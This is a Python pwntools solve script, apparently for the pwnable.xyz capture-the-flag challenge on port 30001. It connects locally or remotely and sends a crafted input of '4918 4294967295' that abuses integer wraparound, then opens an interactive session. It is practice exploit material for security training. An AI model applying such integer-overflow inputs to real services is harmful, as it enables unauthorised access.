from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30001

gdbscript = """
set follow-fork-mode child
"""

args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def main():
    r  = conn()
    r.sendlineafter(b"input: ", b"4918 4294967295")    
    r.interactive()

if __name__ == "__main__":
    main()
